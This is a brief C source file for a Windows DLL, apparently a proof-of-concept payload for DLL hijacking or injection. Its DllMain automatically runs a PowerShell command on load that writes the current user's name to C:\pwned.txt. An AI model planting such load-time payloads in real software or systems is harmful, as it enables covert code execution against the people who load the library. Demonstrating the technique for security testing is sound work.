#include <stdio.h>
#include <windows.h>
#define EXPORT __declspec(dllexport)

EXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL,
                           DWORD fdwReason, LPVOID lpvReserved) 
{
  if(fdwReason == DLL_PROCESS_ATTACH)
    system("powershell -command echo Payload ran as"
           " $(whoami) > C:\\pwned.txt");
    
  return TRUE;
}
